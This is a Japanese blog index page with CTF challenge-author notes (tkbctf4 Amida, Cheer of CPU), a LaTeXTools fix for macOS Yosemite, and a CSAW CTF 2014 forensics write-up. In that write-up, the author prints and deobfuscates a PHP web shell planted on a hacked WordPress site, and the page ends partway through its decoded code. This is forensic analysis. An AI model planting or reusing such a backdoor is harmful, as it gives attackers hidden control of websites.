
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Hello (forgotten) world</title>
  <meta name="author" content="Mei Akizuru">

  
  <meta name="description" content="Cheer of CPUに続きましてmisc 400、amidaでございます。 この問題は私と@yuscarletによる作成です。 問題 203.178.132.117:42719 Ghost Leg - Wikipedia, the free encyclopedia &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://tech.aquarite.info/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <link href="/stylesheets/data-table.css" media="screen, projection" rel="stylesheet" type="text/css" />
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="Hello (forgotten) world" type="application/atom+xml">
  <meta name="twitter:widgets:csp" content="on">

<link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href='http://fonts.googleapis.com/css?family=Lato:400,100,100italic,300,300italic,400italic,700,700italic,900,900italic' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Lora:400,400italic,700,700italic' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Source+Code+Pro:200,300,400,500,600,700,900' rel='stylesheet' type='text/css'>




  

</head>

<body   >
  <header role="banner"><hgroup>
</hgroup>

</header>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/11/24/tkbctf4-amida/">Tkbctf4 [Misc 400] Amida</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-11-24T06:11:50+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="/blog/2014/11/24/tkbctf4-cheerofcpu/">Cheer of CPU</a>に続きましてmisc 400、amidaでございます。</p>

<p>この問題は私と@yuscarletによる作成です。</p>

<h1>問題</h1>

<blockquote><p><code>203.178.132.117:42719</code></p>

<p><a href="http://en.wikipedia.org/wiki/Ghost_Leg">Ghost Leg - Wikipedia, the free encyclopedia</a></p></blockquote>

<p>現在問題文中のサーバーは停止しています。こちらもソースコードはgithubで公開されていますので、試したい方はどうぞ。<a href="https://github.com/tkbctf/tkbctf4/tree/master/misc400_amida">tkbctf4/misc400_amida at master · tkbctf/tkbctf4</a></p>

<p>なお実際の問題は<a href="https://github.com/mayth/fafrotskies">fafrotskies</a>というCPUを100%持っていく素敵な自作サーバーと連携して動作していました。</p>

<p>問題中に英語版Wikipediaの&#8221;Ghost Leg&#8221;の記事にリンクが張ってありますが、「あみだくじ」って英語では&#8221;Ghost Leg&#8221;というそうです。</p>

<h1>概要</h1>

<p>所定のサーバーにアクセスすると無駄なようこそメッセージの後にBase64な文字列が降ってきます。これをデコードするとPNG画像が現れます。画像の内容はあみだくじの画像で、縦棒の各上端（始点）に番号が振られていて、縦棒のうち1つの下端（終点）に黒丸があります。黒丸に辿り着くような始点の番号をサーバーに送りつけて、正解なら次の問題が送られてきて、不正解ならその場で切断されます。こんな感じで1ステージ50問×20ステージ、計1000問解くとフラグが降ってきます。</p>

<p>とはいえまぁ単純なあみだくじを1000問も解かせるなんてことはないわけです。5ステージを1つのブロックとすると4つのブロックがあるわけですが、最初のブロックから次のような感じであみだくじが変化していきます。</p>

<ol>
<li>普通のあみだくじ</li>
<li>横線が波線になる（横線の始点と終端のy座標は同じ）</li>
<li>あみだくじが回転する（0°〜359°）</li>
<li>横線が波線になり、かつ回転する</li>
</ol>


<p>で、各ブロックの最初のステージでは縦線が4本ですが、次のステージでは5本、その次では6本……となり、ブロックの5ステージ目では縦線が8本になります。次のブロックに進むと縦線の数は4本に戻り再び8本まで増えていきます。</p>

<p>この辺はリポジトリの<code>casegen</code>を参照してください。<code>casegen</code>はステージ数を受け取ってそれを元に<code>amida_ev</code>に渡す引数を変えるRubyスクリプトです。<code>amida_ev</code>は<code>generator.cpp</code>をコンパイルしたバイナリで、それに渡す引数で生成されるあみだくじが変わるようになっています。<code>-r</code>で回転、<code>-w</code>で波線、<code>-nN</code>で縦線がN本になります。</p>

<p>なお、さすがに全問解かないとフラグが来ないのでは時間的に誰も辿り着けない可能性があったので、問題投入後しばらくしてから各ブロックの終了時にチェックポイントを追加し、結果的に配点が変わりました。元々最終フラグのsubmitで300点でしたが、チェックポイント3つと最終フラグ1つの計4つのフラグにそれぞれ100点を割り振り合計400点の問題となりました。</p>

<p>結局競技時間内に最終フラグをsubmit出来たチームはありませんでしたが、非常に惜しいことになっていたチームがあったようで……</p>

<blockquote class="twitter-tweet" lang="ja"><p>何がCongrats!だ，checkpointという文字列を入れろ</p>&mdash; まーす (@__math) <a href="https://twitter.com/__math/status/529212264402804736">2014, 11月 3</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>




<blockquote class="twitter-tweet" lang="ja"><p>まーす氏にあみだプログラム貰って俺の環境でも動かしてたら終了5分前に1つヒットする→ログに吐いてない→大慌てでうさみみ64bit版落としてくる→終了30秒後にメモリから救出出来る</p>&mdash; きひろちゃん (@aki33524) <a href="https://twitter.com/aki33524/status/529212031551815680">2014, 11月 3</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>私「（最終）フラグはcheckpointじゃない」</p>

<h1>プログラムについて</h1>

<p>地味に面倒なことをしています。元々単純に縦線を描画して、y座標をランダムに生成してそこに横線を描く（なお横線が直線だとは言っていない）、という実装だったんですが、横線が連続してしまうケースとか、終端に横線がくっついてしまうケースとかがあって、その辺を調整した上で横線の座標を決定する辺りを@yuscarletに書いてもらいました。それ以外にはオプションのパースの実装も書いてもらっています。</p>

<p>なので私はあまりその辺のロジックはあまり苦労してなくて（逆に言うとロジックで面倒なところは全部やってもらった）、むしろ私を苦しめたのはcairoだったのでした……。何が一番つらかったかってPNG画像をファイルに吐くか、吐き出すデータ(<code>unsigned char*</code>)を受け取るコールバックを指定して吐き出すかのどちらかしか選択肢がなくて、「えっ適当なバッファに全部吐き出す関数とかそういうのないんですかファイルに出力する関数はあるのにえっ？」ってなってました。しかもコールバックに渡されるデータはどうやら「逐次」渡され、PNGファイル全体を出力するまでコールバックは複数回呼ばれるという仕様でいよいよ私の睡眠時間は0に近付いていきましたとさ。</p>

<p>そんな感じで、久々にグローバルに<code>unsigned char *buffer</code>とかいう変数を宣言しつつ、あとは適当にネットに転がっているbase64の実装を拾ってきてバッファ上のPNGファイルデータをエンコードして出力するようなプログラムを仕上げました。</p>

<p>ちなみに私が元々「サンプル実装」として書いたコードが出発点なせいで相当なクソコードになってたのでtkbctf4前半（1日目）終了後に書き直した上でbase64エンコードとかその辺追加してました。時間がないときに限って書き直したくなる法則が発動しました。おかげで寝られませんでした。</p>

<h1>感想とか諸々</h1>

<h2>元ネタ</h2>

<p>名前が名前だけに気付いている人もいましたが、この問題の元ネタは夏に行われたSECCON 2014オンライン予選で出題された「あみだくじ」です（リポジトリのREADMEにも記述しています）。</p>

<p>「あみだくじ」でやることとしてはこの問題と同じで所定の終端に辿り着く始点の番号をひたすら答えるとフラグがもらえる、という問題でした。この問題と異なる点はこんな感じ。</p>

<ul>
<li>あみだくじが画像じゃない（アスキーアート）</li>
<li>あみだくじがbase64じゃない</li>
<li>あみだくじが任意の角度に回転しない（アスキーアートだし）</li>
<li>あみだくじが上下反転する（180°の回転ではなくて上下のフリップという感じ）</li>
<li>実行バイナリが配布される形式であり、ローカルで試行出来る</li>
<li>何度実行しても出題される内容や順序は全く同じ</li>
<li>出題の度にsleepが挟まれている</li>
</ul>


<p>元ネタになった問題を解いたのも私と@yuscarletでして、まぁなんというか地味に苦しめられたというかなんというか。「任意の」角度には回転しないもののあみだくじが横向きになるとかはあって、形式が変わったためにプログラムが例外吐いて死ぬ度に私たちも悲鳴を上げながらプログラムを修正していく作業をひたすらしてました（最終的には総当たりしたんですけど）。それはともかく、その記憶がまだ鮮明に残っている中で私と@yuscarletで酒を飲んでるときに「なんかもっと嫌らしい『あみだくじ』作れねえかな」みたいな話になって、まずは画像化しようって話になって、「画像化してもなんか世の中には線認識ライブラリくらい転がってるから大丈夫じゃろｗ」とか言いながら適当にサンプル的な出題プログラムの実装書いてたらマジでそのまま問題になっちゃったって感じです。この段階ではもっと強烈な加工をかけることも考えてましたが自分たちで解法が実装どころか思いつきすらしなかったのでやめました。</p>

<p>まぁそういうわけで、つまるところ酔った勢いみたいなところは大いにあるわけで、</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/shiracamus">@shiracamus</a> 相当恨らまれてるな、これはｗ</p>&mdash; しらかみゅ (@shiracamus) <a href="https://twitter.com/shiracamus/status/529182836943630336">2014, 11月 3</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>決して恨んでるわけではないです……はい……。（むしろ前述のfafrotskiesがCPUを100%持っていくので私が鯖管に恨まれている可能性の方が高い）</p>

<p>あとは元ネタの方のwrite-upを書いてあるのでそちらで。 <a href="/blog/2014/07/20/seccon2014-online-amida/">SECCON 2014 オンライン予選 【あみだくじ】</a></p>

<h2>難易度、解法とか</h2>

<p>元ネタとの相違で挙げた最後の2点だけでもぼちぼち難易度違ったんじゃないかなぁと思っています。というのも、ローカルで試行出来て何度やっても同じということはトライアンドエラーがいくらでも効くということで、実際私たちはこの問題を総当たりで解いています（sleepはopに潰してもらいましたが）。&#8221;amida&#8221;では問題生成はサーバー側で、しかも毎回ランダムに問題が生成されるのでそういうわけにはいかず、まともにあみだくじのソルバを書く必要があります。といっても、あみだくじの構造さえわかってしまえばソルバの実装自体は大して難しくはなくて、事実上「いかに回転する画像と戦いながら画像を認識するか」という問題だったと思います（横線が波線になるのは回転に比べれば大した問題ではないです）。</p>

<p>ちなみに初期の段階での想定解実装はOpenCVを使っていて、波線にした瞬間爆死したので真面目に線の認識をすると逆に死ぬんじゃないかと思います。その辺上手く手抜き（？）して直接ピクセルデータ見に行って云々ってやった方が確実ですし、そもそもOpenCVとか入れなくていいんで幸せになれたのではないでしょうか。</p>

<p>チェックポイント追加後のフラグ送信スピードとか見てるとやっぱ回転する辺りが大きな関門になってたのかなぁという印象です。黒丸のy座標を使うとか色々方法はあったようですが、ぶっちゃけこちらの想定解よりよほど頭のいい解法を皆さん考えられててすごいなぁと思って見てました（小並感）。</p>

<h1>最後に</h1>

<p>酔った勢いでも問題のアイディアは出てくるので、作問で詰まったら酒を飲もう！！！！（確か日本酒飲んでた気がする）</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/11/24/tkbctf4-cheerofcpu/">Tkbctf4 [Bin300] Cheer of CPU</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-11-24T04:16:38+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>tkbctf4が終了してからずいぶんと時間が経ちましたが皆様いかがお過ごしでしょうか。今更ではありますが[bin300] Cheer of CPUの解説というか、そんなようなものを書いてみようかと。</p>

<p>なお、問題のソースコードと配布されたバイナリはtkbctfのgithubリポジトリにあるので、そちらもどうぞ。 <a href="https://github.com/tkbctf/tkbctf4/tree/master/bin300_CheerOfCPU">tkbctf4/bin300_CheerOfCPU at master · tkbctf/tkbctf4</a></p>

<h1>問題</h1>

<blockquote><p>Did you hear a cheer of CPU?</p>

<p>The flag is the SHA-256 checksum of the program&rsquo;s output.</p>

<p>sample: <code>ruby -rdigest/sha2 -e 'puts Digest::SHA256.hexdigest("OUTPUT HERE".strip).downcase'</code></p>

<p><a href="https://s3-ap-northeast-1.amazonaws.com/tkbctf4/cheerofcpu">https://s3-ap-northeast-1.amazonaws.com/tkbctf4/cheerofcpu</a></p></blockquote>

<h1>概要</h1>

<p>問題の内容としてはあるプログラムが渡されるのでそれを調べる、というものです。プログラムは何かしら入力するとそれが所定の文字列と一致するかを調べ、一致していたら何らかのテキストを出力します。そのテキストのSHA256値を取って送りつければ得点となります。これだけ聞くととっても簡単ですが問題はコイツが<strong>64bit Mach-Oバイナリ</strong>ということでした。</p>

<h1>経緯</h1>

<p>元々は「なんか怪しげな言語でバイナリ吐いて読ませるような問題を作ろうぜ」というのが出発点です。様々な言語が候補に現れては消えていきましたが、私がちょうどMacを持ってるということでSwiftに白羽の矢が立ちました。（ちなみにこの発想から作られたもうひとつの問題は&#8221;rakuda&#8221;です。あの問題、なんか別ゲーになってる気がしますけど）</p>

<p>たださすがに当初はx86_64 Mach-Oで出すという想定はしていませんでした。が、コマンドラインアプリケーションとして作ってしまったのでiOSアプリにすることもできず、かといってSwiftコンパイラがそもそもx86環境向けのバイナリを吐けるようにできていないので、まぁそういう問題もありかなみたいな判断で結局x86_64 64bit Mach-Oで出題しました。</p>

<p>たださすがにMac OS X 10.10 (Yosemite) SDK使ったのはやりすぎだったかなと反省しております（とはいえ、私の環境には1つ前のバージョン、すなわち10.9 MavericksのSDKまでしか入ってなかったわけですが）。</p>

<h1>プログラムに関して</h1>

<p>というわけではじめてのSwiftかいはつ、となったんですがなんかSwiftの記法が結構キモくて大変でした（※個人の感想です）。あとSwiftって識別子に絵文字が使えることで有名ですが、なんかどっかで関数名見えたら嫌だなぁとか思ったので絵文字を使ったところgithubで見事に化けました。実際はこんな感じの開発風景でした。</p>

<p><img src="/images/20141124_cheerofcpu_sourcess.png" alt="screenshot of Cheer of CPU development environment" /></p>

<p>なんとなく格納されてるデータとか関数の役割とかが見えてきますね！　見えてきませんか？　見えてくるんでしょう？　……そうなんでしょ？</p>

<p>文字通りにクソみたいな見た目のコードは置いておいてその内容について触れておきます。内部でテキストデータは基本的に<code>Byte</code>(<code>UInt8</code>)の配列と<code>Int</code>の配列のタプルで保持されています。<code>strings</code>対策ですね。タプルの1つ目の要素がシャッフルされ、暗号化された状態のテキストのバイト列、2つ目の要素がシャッフル順です。シャッフルと書きましたが、テキストのバイト列はシャッフルされた後に暗号化された状態で保持されており、元の順番に復元するための情報が2つ目の要素にある配列、ということになります。暗号化は単純なxorですが、1要素暗号化する度にキーが変化するようになっています。その辺はソースコードを見て頂ければ。なお、最終的に出力されるテキストデータだけは、正解のキーを元にして生成された暗号化鍵と初期化ベクタを用いて、ChaCha20で暗号化された状態で保持しています。ちなみにChaCha20採用の理由ですが、CryptoSwiftに入っていたから以外に特に理由はないです。</p>

<p>動作としては概要で述べたもので、起動すると入力待ちになるので「キー」を入力します。これを内部で保持しているデータと比較し、一致していればそのキーを用いて鍵と初期化ベクタを生成し、テキストデータを復号化して出力します。</p>

<h1>作ってみた・出してみた感想とか諸々</h1>

<p>問題の難易度的には明らかに「プログラムが動く（または解析出来る）環境を用意出来るか否か」がハードルという感じでしたね。動かせる環境(Yosemite)があれば総当たりで行ける問題だなぁとか元々思ってたので事実上CTFプレイヤーにおけるMac普及率調査みたいになっていた感じもあります。別にApple信者でもなんでもないのでMac買ってくださいとは言いませんが。あるいはIDA Pro（無料版でない）があれば解析可能だったかと思います。私は持ってませんがopがやってたのでたぶん大丈夫だったんでしょう、たぶん（ていうかtkbctf4のバイナリ問はIDA Pro Freeで解析可能な問題の方が少なかったという異常事態でしたね）。</p>

<p>皆さんはこの無駄に高いハードルを超えて（Macを買うにしろIDA Proを買うにしろ『素人が購入するとは考えにくい』お値段故、素人ではないであろう皆さんでも難しいでしょう）「CPUの歓声」を聞くことは出来たでしょうか。</p>

<p>ちなみに、これ出題してから&#8221;tkbctf&#8221;とか色々なワードでTwitterで検索かけてまして、64bit Mach-Oバイナリに思わず「歓声」を上げる皆さんを見て爆笑してたりしました（こういうのを性格が悪いと言います）。</p>

<p>あとタイトルの元ネタの鮮度がちと古かった気がするなぁという感もあります。ソースコード上げたリポジトリのREADMEにも書きましたが、皆さん覚えているでしょうか。時は5ヶ月前、2014年6月。WWDC 2014で世にSwiftが発表され、The Swift Programming Languageが公開された後にTwitterを席巻した、あの衝撃の発言を。</p>

<blockquote class="twitter-tweet" data-cards="hidden" lang="ja"><p>Swiftの関数はHaskell風。これはいい。マシン語が透けて見える。CPUの歓声が聞こえてきそうだ <a href="http://t.co/tfWwKe5e03">pic.twitter.com/tfWwKe5e03</a></p>&mdash; Ryo Shimizu (@shi3z) <a href="https://twitter.com/shi3z/status/473627881055485952">2014, 6月 3</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>（もちろんこの前後にも<strong>とても素晴らしい発言</strong>があるわけですが）</p>

<p>Swiftの関数はHaskell風、マシン語が透けて見える、CPUの歓声が聞こえてきそう——もう見るだけで頭がクラクラしてきそうな圧倒的で革新的で先進的で最も優れた表現力を持ったこのツイートに感銘を受け、今回の問題はSwiftで書かれているということで、このツイートをリスペクトして問題名にしました。このような素晴らしいツイートを世に送り出してくださったRyo Shimizu(@shi3z)氏にはこの場を借りて感謝の意を述べさせて頂きます。</p>

<p>しかしながら、個人的に「マシン語が透けて見える」というとこちらの方を推しておきます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>マシン語が透けて見える。CPUの歓声が聞こえてきそうだ <a href="http://t.co/drJMSTIdFQ">pic.twitter.com/drJMSTIdFQ</a></p>&mdash; 秋弦めい☂小傘ちゃんかわいい (@maytheplic) <a href="https://twitter.com/maytheplic/status/473701724574605313">2014, 6月 3</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<h1>最後に</h1>

<p><strong>小傘ちゃんかわいい。</strong></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/10/17/sublime-latex-yosemite/">YosemiteでSublime Text 3 + LaTeXToolsを使ったらPDF出てこない話</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-10-17T17:56:46+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>覚え書き。</p>

<p>今日公開されたMac OS X Yosemite (10.10)に早速更新したところ、Sublime Text 3 + LaTeXToolsの環境でLaTeXをビルドしてもPDFが出力されなくなった。</p>

<p>この問題はYosemiteがbetaの時点でアップグレードして報告した猛者がいた。<a href="https://github.com/SublimeText/LaTeXTools/issues/401">LaTeXTools on OS X 10.10 · Issue #401 · SublimeText/LaTeXTools</a></p>

<blockquote><p>opened this issue on 5 Jun</p></blockquote>

<p>（白目）</p>

<p>症状としては上述の通り。ビルドを実行したときにコンソールへ吐き出されているログはこんな感じ。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to thread Thread-13
</span><span class='line'>['latexmk', '-cd', '-e', "$latex = 'uplatex %O -interaction=nonstopmode -synctex=1 %S'", '-e', "$biber = 'biber %O --bblencoding=utf8 -u -U --output_safechars %B'", '-e', "$bibtex = 'upbibtex %O %B'", '-e', "$makeindex = 'makeindex %O -o %D %S'", '-e', "$dvipdf = 'dvipdfmx %O -o %D %S'", '-f', '-norc', '-gg', '-pdfdvi', 'report.tex']
</span><span class='line'>Finished normally
</span><span class='line'>12
</span><span class='line'>Exception in thread Thread-13:
</span><span class='line'>Traceback (most recent call last):
</span><span class='line'>  File "./threading.py", line 901, in _bootstrap_inner
</span><span class='line'>  File "/Users/mayth/Library/Application Support/Sublime Text 3/Packages/LaTeXTools/makePDF.py", line 147, in run
</span><span class='line'>    data = open(self.caller.tex_base + ".log", 'rb').read()
</span><span class='line'>FileNotFoundError: [Errno 2] No such file or directory: '/Users/mayth/Documents/report.log'</span></code></pre></td></tr></table></div></figure>


<p><code>report.{pdf,log}</code>。察して。</p>

<p>それはともかく、どうやらこれは<a href="https://github.com/SublimeText/LaTeXTools/issues/401#issuecomment-59058434">YosemiteでデフォルトのPATHの値が変わっているのが原因</a>らしい。そこで、肝心のコマンドを呼んでいるところでPATHを追加してあげればよい。</p>

<p><a href="https://github.com/SublimeText/LaTeXTools/issues/401#issuecomment-59080557">LaTeXTools on OS X 10.10 · Issue #401 · SublimeText/LaTeXTools</a>から引用すると</p>

<blockquote><p>proc = subprocess.Popen(cmd, stderr=subprocess.STDOUT, stdout=subprocess.PIPE,
env=os.environ)</p></blockquote>

<p>これは<code>makePDF.py</code>の中に含まれている。Macでは<code>makePDF.py</code>は以下のパスにある。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$HOME/Library/Application Support/Sublime Text 3/Packages/LaTeXTools/</span></code></pre></td></tr></table></div></figure>


<p>パス辿るのが面倒ならPreferences -> Browse Packagesを使えばPackagesフォルダがFinderで開かれるので、その中のLaTeXToolsを見ると存在するはず。</p>

<p>現時点では当該の記述は95行目にある。その行に上記引用のように、<code>env=os.environ</code>を追記すると上手く動くようになった。</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/09/23/csawctf2014-forensics/">CSAW CTF 2014 Quals Forensics</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-09-23T03:07:38+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>CSAW CTF 2014 Quals、Forensicsのwrite-upです。私が解いたのはForensicsの4問中、200点のObscurityを除いた3問です。</p>

<h1>[100] dumpster diving</h1>

<h2>問題文</h2>

<blockquote><p>dumpsters are cool, but cores are cooler</p>

<p>Written by marc</p>

<p>firefox.mem.zip</p></blockquote>

<h2>解答</h2>

<p>Answer: cd69b4957f06cd818d7bf3d61980e291</p>

<p>与えられるのは&#8217;firefox.mem.zip&#8217;で、コアダンプです。私が取りかかった時点で既に他のメンバーからbinwalkしてみたらSQLiteのなんかが見えていると報告がありました。Firefoxのコアダンプであれば何か見えててもおかしくないですね。</p>

<p>とりあえずstringsで何か見えないかなと思ってstringsの出力結果を&#8217;flag&#8217;でgrepしてみます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(前略)
</span><span class='line'>etablemoz_annosmoz_annos CREATE TABLE moz_annos (  id INTEGER PRIMARY KEY, place_id INTEGER NOT NULL, anno_attribute_id INTEGER, mime_type VARCHAR(32) DEFAULT NULL, content LONGVARCHAR, flags INTEGER DEFAULT 0, expiration INTEGER DEFAULT 0, type INTEGER DEFAULT 0, dateAdded INTEGER DEFAULT 0, lastModified INTEGER DEFAULT 0)
</span><span class='line'>ZZZZZZZZflag{cd69b4957f06cd818d7bf3d61980e291}
</span><span class='line'>ZZZZZZZZZZZZZZTransparent BG enabling flag
</span><span class='line'>(後略)</span></code></pre></td></tr></table></div></figure>


<p>マジで見つかりました。本当にありがとうございました。</p>

<h1>[200] why not sftp?</h1>

<h2>問題文</h2>

<blockquote><p>well seriously, why not?</p>

<p>Written by marc</p>

<p>traffic-5.pcap</p></blockquote>

<h2>解答</h2>

<p>Answer: 91e02cd2b8621d0c05197f645668c5c4</p>

<p>与えられる&#8217;traffic-5.pcap&#8217;をとりあえずWiresharkで見てみます。問題名が&#8217;why not sftp?&lsquo;なんだし、きっとFTP通信でなんかやってるだろうと思ってftpとftp-dataでフィルタします。通信を追っていくと&rsquo;/files/zip.zip&#8217;をダウンロードしています。当該するdataの方の通信をFollow TCP Streamするとflag.pngとか書いてあるのでまず間違いなさそうです。ftp-dataのパケットからzip.zipを抽出します。</p>

<p>取り出したzip.zipはパスワードも何もかかっていないのでそのまま展開します。するとflag.pngが展開され、それにフラグが書かれていました。</p>

<p>余談ですが、HTTPでやりとりしたファイルはWiresharkのExport Objectsから取り出せますが、FTPの場合はデータ通信の方をFollow TCP StreamしてRawで保存すればよいことをお勉強しました。</p>

<h1>[300] Fluffy No More</h1>

<h2>問題文</h2>

<blockquote><p>OH NO WE&rsquo;VE BEEN HACKED!!!!!! &ndash; said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site&rsquo;s users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious &ldquo;Forgotten Freaks&rdquo; hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??</p>

<p>Well&hellip; The fluff needs your stuff. I&rsquo;ve pulled the logs from the server for you along with a backup of it&rsquo;s database and configuration. Figure out what is going on!</p>

<p>Written by brad_anton</p>

<p>CSAW2014-FluffyNoMore-v0.1.tar.bz2</p></blockquote>

<h2>解答</h2>

<p>Answer: Those Fluffy Bunnies Make Tummy Bumpy</p>

<p>与えられたアーカイブを展開すると、etc_directory.tar.bz、logs.tar.bz2、webroot.tar.bz2、mysql_backup.sql.bz2の4つのファイルが出てきます。それぞれ、etc以下、/var/log以下、/var/www以下を固めたもので、mysql_backup.sql.bz2はmysqldumpの出力結果をbzip2で圧縮したものです。</p>

<p>/var/www以下やデータベースのダンプを見るにWordPressが動いていて、そこがやられたという状況のようです。ひとまずapache2のaccess.logを見ていきます。非常に大きなファイルですが、大半はツールによるアタック試行のログです。SQLインジェクションやら何やらを色々試しています。データベースのダンプを見るとwp_commentsに犯人による犯行予告（「ハックしてやったぜBWHAHAHAHA」じゃなくて「ハックしてやるぜBWHAHAHA」だった）があるので、そのコメントの時刻以降のログを見てみます。</p>

<p>まずPOSTに絞って見てみるとプラグイン絡みでちょっと怪しげなログを見つけました。wysija-newslettersというプラグインで、そのプラグインについて調べてみたところ、任意ファイルのアップロードが可能な脆弱性が存在していたそうです。その後その脆弱性は修正されましたが、実際にはPHPの設定によってはその対策をすり抜けることが可能でした（そしてさらに対策される）。この環境にインストールされているもののバージョンを調べてみると、ちょうどその脆弱性が残っていたバージョンだった上に、<a href="http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html">WordPress Security - MailPoet Vuln Contributes to Thousands of Infected Websites | Sucuri Blog</a>で言及されているのと同じ形のログが残っていました。</p>

<p>アクセスログから/wp-content/uploads/wysija/themes/weblizer/template.phpというのにアクセスしていることがわかったので、そのファイルを見てみます。中身は次のようなPHPファイルです。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
</span><span class='line'>$hije = str_replace("ey","","seyteyrey_reyeeypleyaeyceye");
</span><span class='line'>$andp="JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ";
</span><span class='line'>$rhhm="nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==";
</span><span class='line'>$pvqw="GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw";
</span><span class='line'>$wfrm="bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq";
</span><span class='line'>$vyoh = $hije("n", "", "nbnansne64n_ndnecode");
</span><span class='line'>$bpzy = $hije("z","","zczreaztzez_zfzuznzcztzizon");
</span><span class='line'>$xhju = $bpzy('', $vyoh($hije("sq", "", $andp.$pvqw.$wfrm.$rhhm))); $xhju();
</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>


<p><code>$hije</code>が<code>str_replace</code>、<code>$vyoh</code>が<code>base64_decode</code>、<code>$bpzy</code>が<code>create_function</code>関数です。このとき初めて知ったんですが、PHPでは文字列変数に対して<code>$hoge()</code>みたいに<code>()</code>を付けて使うと、その変数に入っている名前の関数を呼び出すという機能があります。びっくり。</p>

<p>それはともかくとして、このコードは</p>

<ol>
<li><code>$andp</code>、<code>$pvqw</code>、<code>$wfrm</code>、<code>$rhhm</code>を結合する</li>
<li>その中の&#8217;sq&#8217;を取り除く</li>
<li>その文字列をBase64デコードする</li>
<li>その文字列を関数化する</li>
<li>それを実行する</li>
</ol>


<p>というコードです。<code>create_function</code>で関数化されたコードは次のコードです（実際の出力を整形しています）</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$c='count';
</span><span class='line'>$a=$_COOKIE;
